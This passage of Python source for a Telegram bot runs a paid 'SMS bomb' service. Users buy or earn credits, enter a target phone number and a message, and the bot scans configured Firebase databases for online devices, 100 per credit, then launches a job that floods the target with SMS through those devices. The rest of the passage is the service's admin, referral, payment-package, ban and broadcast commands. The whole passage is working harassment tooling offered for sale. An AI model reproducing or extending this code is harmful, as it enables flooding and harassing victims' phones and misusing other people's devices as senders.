    await update.message.reply_text(text_msg, reply_markup=get_cancel_keyboard(), parse_mode=ParseMode.HTML)
    return CREDITS


async def bomb_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id

    if text == BTN_CANCEL or text in ALL_BUTTONS:
        context.user_data.clear()
        await update.message.reply_text(
            f"{T_CROSS} {scp('Operation cancelled.')}",
            reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

    try:
        credits_to_use = int(text)
        if credits_to_use <= 0:
            raise ValueError
    except:
        await update.message.reply_text(
            f"{T_CROSS} {scp('Please enter a valid positive number.')}",
            parse_mode=ParseMode.HTML
        )
        return CREDITS

    user_credits = get_user_credits(user_id)

    if credits_to_use > user_credits:
        await update.message.reply_text(
            f"{T_WARN} {scp('You only have')} <b>{user_credits}</b> {scp('credits.')}\n"
            f"{T_PIN} {scp('Please enter a smaller amount or tap CANCEL.')}",
            reply_markup=get_cancel_keyboard(), parse_mode=ParseMode.HTML
        )
        return CREDITS

    # ⭐ STRICT: max_devices = credits × 100
    max_devices = credits_to_use * DEVICES_PER_CREDIT
    context.user_data["credits_to_use"] = credits_to_use
    context.user_data["max_devices"] = max_devices

    target = context.user_data.get("target", "N/A")
    message = context.user_data.get("message", "")
    firebases_list = load_firebase_urls()

    if not firebases_list:
        await update.message.reply_text(
            f"{T_CROSS} {scp('No Firebase configured.')}",
            reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END

    total_fb = len(firebases_list)
    safe_target = html_escape(str(target))
    safe_message = html_escape(str(message))

    scan_msg = await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_REFRESH} <b>{scp('SCANNING DEVICES')}</b> {T_REFRESH}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> 0/{total_fb} {scp('checked')}\n"
        f"{T_BOLT} <b>{scp('DEVICE')}:</b> 0/{max_devices} {scp('found')}\n"
        f"{LINE}\n"
        f"{T_GEM} <b>{scp('Credits')}:</b> {credits_to_use}\n"
        f"{T_PIN} <b>{scp('Number')}:</b> <code>{safe_target}</code>\n"
        f"{T_MSG} <b>{scp('Message')}:</b> {safe_message}\n\n"
        f"{T_ARROW} {scp('Please wait...')}",
        parse_mode=ParseMode.HTML
    )

    # ⭐ STRICT SCAN
    selected_devices = []
    checked = 0
    for fb in firebases_list:
        if len(selected_devices) >= max_devices:
            break
        url = fb["url"]
        devices = await get_online_devices(url)
        for d in devices:
            if len(selected_devices) >= max_devices:
                break
            selected_devices.append((fb["id"], d, url))
        checked += 1
        try:
            await scan_msg.edit_text(
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_REFRESH} <b>{scp('SCANNING DEVICES')}</b> {T_REFRESH}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> {checked}/{total_fb} {scp('checked')}\n"
                f"{T_BOLT} <b>{scp('DEVICE')}:</b> {len(selected_devices)}/{max_devices} {scp('found')}\n"
                f"{LINE}\n"
                f"{T_GEM} <b>{scp('Credits')}:</b> {credits_to_use}\n"
                f"{T_PIN} <b>{scp('Number')}:</b> <code>{safe_target}</code>\n"
                f"{T_MSG} <b>{scp('Message')}:</b> {safe_message}\n\n"
                f"{T_ARROW} {scp('Please wait...')}",
                parse_mode=ParseMode.HTML
            )
        except:
            pass

    # ⭐ STRICT TRIM
    if len(selected_devices) > max_devices:
        selected_devices = selected_devices[:max_devices]

    if not selected_devices:
        await scan_msg.edit_text(
            f"{T_CROSS} <b>{scp('No online devices found!')}</b>\n"
            f"{T_MSG} {scp('Please try again later.')}",
            parse_mode=ParseMode.HTML
        )
        context.user_data.clear()
        return ConversationHandler.END

    num_devices = len(selected_devices)

    summary = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_TICK} <b>{scp('SCAN COMPLETE')}</b> {T_TICK}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> {checked}/{total_fb} {scp('checked')}\n"
        f"{T_BOLT} <b>{scp('DEVICES FOUND')}:</b> {num_devices}\n"
        f"{T_GEM} <b>{scp('Credits Used')}:</b> {credits_to_use}\n"
        f"{T_PIN} <b>{scp('Number')}:</b> <code>{safe_target}</code>\n"
        f"{T_MSG} <b>{scp('Message')}:</b> {safe_message}\n"
        f"{LINE}\n\n"
        f"{T_FIRE} <b>{scp('Starting bomb now...')}</b>"
    )
    try:
        await scan_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

    chat_id = update.effective_chat.id
    job_id = str(uuid4())[:8]
    fb_ids = list({fb_id for fb_id, _, _ in selected_devices})
    count = num_devices

    db_add_job(job_id, target, message, fb_ids, chat_id, count, DEFAULT_DELAY, user_id)
    task = asyncio.create_task(execute_bomb_job(
        job_id, target, message, fb_ids, count, DEFAULT_DELAY, user_id
    ))
    running_jobs[job_id] = task

    await update.message.reply_text(
        f"{T_OK} {scp('Bomb started! Watch above for live progress.')}",
        reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
    )
    context.user_data.clear()
    return ConversationHandler.END


async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data.clear()
    await update.message.reply_text(
        f"{T_CROSS} {scp('Operation cancelled.')}",
        reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END


# ---------- COMMANDS ----------
async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id)
    ref_count = get_referral_count(user_id)
    credits = get_user_credits(user_id)
    bot_username = (await context.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={user_id}"

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_USERS} <b>{scp('REFERRAL SYSTEM')}</b> {T_USERS}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_LINK} <b>{scp('Your Referral Link')}:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"{T_STAR} <b>{scp('Your Chat ID')}:</b> <code>{user_id}</code>\n"
        f"{T_USERS} <b>{scp('Total Referrals')}:</b> {ref_count}\n"
        f"{T_MONEY} <b>{scp('Credits')}:</b> {credits}\n\n"
        f"{LINE}\n"
        f"{T_SPARKLES} <b>{scp('How it works')}:</b>\n"
        f"• {scp('Share your link with friends')}\n"
        f"• {scp('They join all channels')}\n"
        f"• {scp('You get')} <b>{REFERRAL_REWARD} {scp('Credit')}</b> {scp('instantly')}\n"
        f"• {scp('Credits added automatically')}\n\n"
        f"{T_GIFT} <b>{scp('Share more')} → {scp('Earn more!')}</b>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def buy_points_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = []
    for pkg_id, pkg in POINT_PACKAGES.items():
        keyboard.append([
            InlineKeyboardButton(pkg["label"], callback_data=f"buy_{pkg_id}", icon_custom_emoji_id=E_GIFT)
        ])
    keyboard.append([
        InlineKeyboardButton(scp("Contact Owner"), url=f"https://t.me/{OWNER.lstrip('@')}", icon_custom_emoji_id=E_CROWN)
    ])

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_GIFT} <b>{scp('BUY CREDITS')}</b> {T_GIFT}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_STAR} <b>{scp('Available Packages')}:</b>\n\n"
        f"{T_MONEY} 50 {scp('Credits')} - ₹200\n"
        f"{T_MONEY} 100 {scp('Credits')} - ₹350\n"
        f"{T_MONEY} 200 {scp('Credits')} - ₹500\n"
        f"{T_CROWN} {scp('Unlimited 1 Month')} - ₹599\n\n"
        f"{LINE}\n"
        f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>\n\n"
        f"{T_MSG} <b>{scp('Select a package below')}:</b>"
    )
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    points = get_user_points(user_id)
    ref_count = get_referral_count(user_id)

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_MONEY} <b>{scp('PREMIUM VAULT')}</b> {T_MONEY}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_HEART_P} <b>{scp('Credits')}:</b> {credits}\n"
        f"{T_GEM} <b>{scp('Points')}:</b> {points}\n"
        f"{T_USERS} <b>{scp('Referrals')}:</b> {ref_count}\n\n"
        f"{T_FIRE} <b>1 {scp('Credit')} = 100 {scp('Devices')}</b>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def show_stats_msg(update: Update, context: ContextTypes.DEFAULT_TYPE = None):
    user_id = update.effective_user.id

    conn = _connect(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM jobs WHERE user_id=?", (user_id,)); user_jobs = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM jobs"); total_jobs = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM jobs WHERE status='completed'"); completed = c.fetchone()[0]
    c.execute("SELECT COALESCE(SUM(success_count), 0) FROM jobs"); total_sent = c.fetchone()[0]
    c.execute("SELECT COALESCE(SUM(fail_count), 0) FROM jobs"); total_fail = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM users"); total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM referrals"); total_referrals = c.fetchone()[0]
    conn.close()

    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    user_credits = get_user_credits(user_id)
    user_refs = get_referral_count(user_id)

    text = (
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_STATS} <b>{scp('STATISTICS')}</b> {T_STATS}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_STAR} <b>{scp('YOUR STATS')}:</b>\n"
        f"{T_MONEY} {scp('Credits')}: {user_credits}\n"
        f"{T_USERS} {scp('Your Referrals')}: {user_refs}\n"
        f"{T_FILE} {scp('Your Jobs')}: {user_jobs}\n\n"
        f"{LINE}\n"
        f"{T_STATS} <b>{scp('GLOBAL STATS')}:</b>\n"
        f"{T_USERS} {scp('Total Users')}: {total_users}\n"
        f"{T_FILE} {scp('Total Jobs')}: {total_jobs}\n"
        f"{T_TICK} {scp('Completed')}: {completed}\n"
        f"{T_MSG} {scp('Total SMS Sent')}: {total_sent}\n"
        f"{T_CROSS} {scp('Total Failed')}: {total_fail}\n"
        f"{T_GIFT} {scp('Total Referrals')}: {total_referrals}\n"
        f"{T_SPARKLES} {scp('Success Rate')}: {rate}%"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /redeem &lt;key&gt;", parse_mode=ParseMode.HTML)
        return
    key = args[0].strip()
    if db_redeem_key(key, user_id):
        credits = get_user_credits(user_id)
        await update.message.reply_text(
            f"{T_TICK} {scp('Key redeemed!')}\n{T_HEART_P} {scp('You now have')} <b>{credits}</b> {scp('credits.')}",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid key or expired.')}", parse_mode=ParseMode.HTML)


async def addkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /addkey &lt;credits&gt; &lt;max_uses&gt;", parse_mode=ParseMode.HTML); return
    try:
        credits = int(args[0]); max_uses = int(args[1])
        if credits <= 0 or max_uses <= 0: raise ValueError
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid values.')}", parse_mode=ParseMode.HTML); return
    key_string = generate_key_string()
    db_add_key(key_string, credits, max_uses, user_id)
    await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_CHECKBOX} <b>{scp('KEY GENERATED')}</b> {T_CHECKBOX}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_STAR} <b>{scp('Key')}:</b> <code>{key_string}</code>\n"
        f"{T_HEART_P} <b>{scp('Credits')}:</b> {credits}\n"
        f"{T_REFRESH} <b>{scp('Max uses')}:</b> {max_uses}\n"
        f"{T_CROWN} <b>{scp('Owner')}:</b> {OWNER}",
        parse_mode=ParseMode.HTML
    )


async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /addcredits &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = float(args[1])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid input.')}", parse_mode=ParseMode.HTML); return
    ensure_user(target_user); update_user_credits(target_user, amount)
    await update.message.reply_text(f"{T_TICK} {scp('Added')} <b>{amount}</b> {scp('credits to')} <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def remcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /remcredits &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = float(args[1])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid input.')}", parse_mode=ParseMode.HTML); return
    ensure_user(target_user); update_user_credits(target_user, -amount)
    await update.message.reply_text(f"{T_TICK} {scp('Removed')} <b>{amount}</b> {scp('credits from')} <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def setcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /setcredits &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = float(args[1])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid input.')}", parse_mode=ParseMode.HTML); return
    ensure_user(target_user); set_user_credits(target_user, amount)
    await update.message.reply_text(f"{T_TICK} {scp('Set credits to')} <b>{amount}</b> {scp('for')} <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def addpoints_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /addpoints &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = int(args[1])
        if amount <= 0: raise ValueError
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid input.')}", parse_mode=ParseMode.HTML); return
    ensure_user(target_user); add_points(target_user, amount)
    await update.message.reply_text(f"{T_TICK} {scp('Added')} <b>{amount}</b> {scp('points to')} <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def rempoints_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /rempoints &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = int(args[1])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid input.')}", parse_mode=ParseMode.HTML); return
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET points = MAX(0, points - ?) WHERE user_id=?", (amount, target_user))
    conn.commit(); conn.close()
    await update.message.reply_text(f"{T_TICK} {scp('Removed')} <b>{amount}</b> {scp('points from')} <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def setpoints_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /setpoints &lt;user_id&gt; &lt;amount&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0]); amount = int(args[1])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid input.')}", parse_mode=ParseMode.HTML); return
    ensure_user(target_user)
    conn = _connect(); c = conn.cursor()
    c.execute("UPDATE users SET points = ? WHERE user_id=?", (amount, target_user))
    conn.commit(); conn.close()
    await update.message.reply_text(f"{T_TICK} {scp('Set points to')} <b>{amount}</b> {scp('for')} <code>{target_user}</code>.", parse_mode=ParseMode.HTML)


async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /ban &lt;user_id&gt; [reason]", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid user ID.')}", parse_mode=ParseMode.HTML); return
    reason = " ".join(args[1:]) if len(args) > 1 else "Violation of rules"
    ban_user(target_user, reason)
    await update.message.reply_text(
        f"{T_LOCK} <b>{scp('USER BANNED')}</b>\n\n{T_USERS} User: <code>{target_user}</code>\n{T_WARN} Reason: {html_escape(reason)}",
        parse_mode=ParseMode.HTML
    )
    try:
        await context.bot.send_message(target_user,
            f"{T_LOCK} <b>{scp('YOU HAVE BEEN BANNED!')}</b>\n\n"
            f"{T_WARN} <b>{scp('Reason')}:</b> {html_escape(reason)}\n{T_CROWN} {scp('Contact')}: {OWNER}",
            parse_mode=ParseMode.HTML)
    except:
        pass


async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /unban &lt;user_id&gt;", parse_mode=ParseMode.HTML); return
    try:
        target_user = int(args[0])
    except:
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid user ID.')}", parse_mode=ParseMode.HTML); return
    unban_user(target_user)
    await update.message.reply_text(
        f"{T_OK} <b>{scp('USER UNBANNED')}</b>\n\n{T_USERS} User: <code>{target_user}</code>",
        parse_mode=ParseMode.HTML
    )
    try:
        await context.bot.send_message(target_user,
            f"{T_OK} <b>{scp('You have been unbanned!')}</b>\n\n{T_SPARKLES} {scp('Welcome back!')}",
            parse_mode=ParseMode.HTML)
    except:
        pass


async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    jobs = db_get_jobs(limit=10, user_id=user_id)
    if not jobs:
        await update.message.reply_text(f"{T_FILE} {scp('No jobs found yet.')}", parse_mode=ParseMode.HTML); return
    text = ("╭━━━━━━━━━━━━━━━━━━╮\n"
            f"   {T_BOOKMARK} <b>{scp('PREMIUM HISTORY')}</b> {T_BOOKMARK}\n"
            "╰━━━━━━━━━━━━━━━━━━╯\n\n")
    for j in jobs:
        se = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
              "cancelled": "🚫"}.get(j["status"], "❓")
        text += f"{se} <b>{html_escape(str(j['target']))}</b> ({j['status']})\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def add_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: <code>/addfb &lt;url&gt;</code>", parse_mode=ParseMode.HTML); return
    url = args[0].strip()
    if not url.startswith("http"):
        await update.message.reply_text(f"{T_CROSS} {scp('Invalid URL.')}", parse_mode=ParseMode.HTML); return
    test = await firebase_request(url + "?shallow=true", "GET")
    if isinstance(test, dict) and test.get("_error"):
        await update.message.reply_text(
            f"{T_CROSS} {scp('Connection failed')} (HTTP {test.get('status',0)}).\n{T_WARN} {html_escape(str(test.get('message','')))}",
            parse_mode=ParseMode.HTML)
        return
    firebases = load_firebase_urls()
    fid = f"fb{len(firebases) + 1}"
    firebases.append({"id": fid, "url": url, "secret": ""})
    save_firebase_urls(firebases)
    await update.message.reply_text(f"{T_TICK} {scp('Firebase added!')} ID: <code>{fid}</code>", parse_mode=ParseMode.HTML)


async def delete_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /deletefb &lt;id&gt;", parse_mode=ParseMode.HTML); return
    fid = args[0].strip()
    firebases = load_firebase_urls()
    new_firebases = [fb for fb in firebases if fb["id"] != fid]
    if len(new_firebases) == len(firebases):
        await update.message.reply_text(f"{T_CROSS} {scp('Firebase')} {fid} {scp('not found.')}", parse_mode=ParseMode.HTML); return
    save_firebase_urls(new_firebases)
    await update.message.reply_text(f"{T_TICK} {scp('Firebase')} {fid} {scp('deleted.')}", parse_mode=ParseMode.HTML)


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(f"{T_CROSS} {scp('Unauthorized.')}", parse_mode=ParseMode.HTML); return
    user_ids = get_all_user_ids()
    if not user_ids:
        await update.message.reply_text(f"{T_WARN} {scp('No users found.')}", parse_mode=ParseMode.HTML); return

    photo = None; caption = None
    if update.message.photo:
        photo = update.message.photo[-1].file_id
        caption = update.message.caption or ""
    else:
        if context.args: caption = " ".join(context.args)
        else:
            await update.message.reply_text(f"{T_MSG} {scp('Usage')}: /broadcast &lt;message&gt;", parse_mode=ParseMode.HTML); return

    safe_caption = html_escape(caption)

    sent_count = 0; fail_count = 0
    for uid in user_ids:
        try:
            if photo:
                await BOT.send_photo(chat_id=uid, photo=photo, caption=safe_caption, parse_mode=ParseMode.HTML)
            else:
                await BOT.send_message(chat_id=uid, text=safe_caption, parse_mode=ParseMode.HTML)
            sent_count += 1; await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"broadcast {uid}: {e}"); fail_count += 1
    await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_MEGA} <b>{scp('BROADCAST DONE')}</b> {T_MEGA}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_TICK} <b>{scp('Delivered')}:</b> {sent_count}\n"
        f"{T_CROSS} <b>{scp('Failed')}:</b> {fail_count}",
        parse_mode=ParseMode.HTML)


# ---------- BUTTON HANDLER ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if is_banned(user_id):
        u = get_user(user_id)
        reason = u.get("ban_reason") or "Violation of rules"
        await update.message.reply_text(
            f"{T_CROSS} <b>{scp('YOU ARE BANNED!')}</b>\n\n"
            f"{T_WARN} <b>{scp('Reason')}:</b> {html_escape(str(reason))}\n{T_CROWN} {scp('Contact')}: {OWNER}",
            parse_mode=ParseMode.HTML)
        return

    if text not in ["/start", "/ping"]:
        joined, missing = await check_channel_membership(user_id, context.bot)
        if not joined:
            ch_list = "\n".join([f"• {html_escape(ch)}" for ch in missing])
            await update.message.reply_text(
                f"{T_WARN} <b>{scp('Please join all channels!')}</b>\n\n{scp('Missing')}:\n{ch_list}\n\n"
                f"{T_CROWN} {scp('Owner')}: {OWNER}",
                reply_markup=get_join_keyboard(), parse_mode=ParseMode.HTML)
            return

    if context.user_data.get("awaiting_redeem"):
        key = text.strip()
        if db_redeem_key(key, user_id):
            credits = get_user_credits(user_id)
            await update.message.reply_text(
                f"{T_TICK} <b>{scp('KEY REDEEMED!')}</b>\n"
                f"{T_HEART_P} {scp('You now have')} <b>{credits}</b> {scp('credits.')}",
                parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{T_CROSS} {scp('Invalid key.')}", parse_mode=ParseMode.HTML)
        context.user_data.pop("awaiting_redeem", None)
        return

    if text == BTN_LAUNCH_BOMB:
        await bomb_wizard_start(update, context)
    elif text == BTN_BALANCE:
        await balance_command(update, context)
    elif text == BTN_STATUS:
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await update.message.reply_text(f"{T_STATS} {scp('No jobs yet.')}", parse_mode=ParseMode.HTML); return
        out = ("╭━━━━━━━━━━━━━━━━━━╮\n"
               f"   {T_STATS} <b>{scp('STATUS REPORT')}</b> {T_STATS}\n"
               "╰━━━━━━━━━━━━━━━━━━╯\n\n")
        for j in jobs:
            se = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
                  "cancelled": "🚫"}.get(j["status"], "❓")
            out += (f"{se} {T_PIN} {scp('Number')}: <code>{html_escape(str(j['target']))}</code>\n"
                    f"   {T_MSG} {scp('Total')}: {j.get('total_sms',0)} | {T_TICK} {j.get('success_count',0)} | {T_CROSS} {j.get('fail_count',0)}\n"
                    f"   {T_MONEY} {scp('Credits')}: {j.get('credit_used',0)} | 🕒 {j['created_at'][:16]}\n"
                    f"   {T_SPARKLES} {j['status']}\n{LINE_THIN}\n")
        await update.message.reply_text(out, parse_mode=ParseMode.HTML)
    elif text == BTN_HISTORY:
        await history_command(update, context)
    elif text == BTN_REDEEM_KEY:
        context.user_data["awaiting_redeem"] = True
        await update.message.reply_text(
            f"{T_CHECKBOX} <b>{scp('REDEEM KEY')}</b>\n\n"
            f"{T_MSG} {scp('Please send the key.')}\n"
            f"{T_PIN} {scp('Example')}: <code>ABCD1234</code>",
            parse_mode=ParseMode.HTML)
    elif text == BTN_REFERRAL:
        await referral_command(update, context)
    elif text == BTN_BUY_POINTS:
        await buy_points_command(update, context)
    elif text == BTN_ADMIN_PANEL and user_id in ADMIN_IDS:
        await admin_panel_command(update, context)
    elif text == BTN_ONLINE_DEV and user_id in ADMIN_IDS:
        await show_devices_msg(update)
    elif text == BTN_STATS_HIST and user_id in ADMIN_IDS:
        await show_stats_msg(update)
    elif text == BTN_MANAGE_FB and user_id in ADMIN_IDS:
        await manage_fb_msg(update)
    elif text == BTN_GEN_KEY and user_id in ADMIN_IDS:
        await update.message.reply_text(
            f"{T_CHECKBOX} <b>{scp('GENERATE KEY')}</b>\n\n"
            f"{T_MSG} {scp('Use')}: <code>/addkey &lt;credits&gt; &lt;max_uses&gt;</code>",
            parse_mode=ParseMode.HTML)


async def show_devices_msg(update):
    firebases = load_firebase_urls()
    if not firebases:
        await update.message.reply_text(f"{T_WARN} {scp('No Firebase configured.')}", parse_mode=ParseMode.HTML)
        return
    total_fb = len(firebases)
    scan_msg = await update.message.reply_text(
        "╭━━━━━━━━━━━━━━━━━━╮\n"
        f"   {T_REFRESH} <b>{scp('SCANNING FIREBASES')}</b> {T_REFRESH}\n"
        "╰━━━━━━━━━━━━━━━━━━╯\n\n"
        f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> 0/{total_fb} {scp('checked')}\n"
        f"{T_BOLT} <b>{scp('DEVICE')}:</b> 0 {scp('found')}\n\n{T_MSG} {scp('Please wait...')}",
        parse_mode=ParseMode.HTML)
    all_devices = []
    checked = 0
    for fb in firebases:
        devices = await get_online_devices(fb["url"])
        checked += 1
        for d in devices:
            d["fb_id"] = fb["id"]
            url = fb["url"]
            fb_name = url.replace("https://", "").replace("http://", "").split(".")[0]
            d["fb_name"] = fb_name
            all_devices.append(d)
        try:
            await scan_msg.edit_text(
                "╭━━━━━━━━━━━━━━━━━━╮\n"
                f"   {T_REFRESH} <b>{scp('SCANNING FIREBASES')}</b> {T_REFRESH}\n"
                "╰━━━━━━━━━━━━━━━━━━╯\n\n"
                f"{T_REFRESH} <b>{scp('FIREBASE')}:</b> {checked}/{total_fb} {scp('checked')}\n"
                f"{T_BOLT} <b>{scp('DEVICE')}:</b> {len(all_devices)} {scp('found')}\n\n{T_MSG} {scp('Please wait...')}",
                parse_mode=ParseMode.HTML)
        except:
            pass
    if not all_devices:
        await scan_msg.edit_text(f"{T_WARN} <b>{scp('No online devices.')}</b>", parse_mode=ParseMode.HTML)
        return
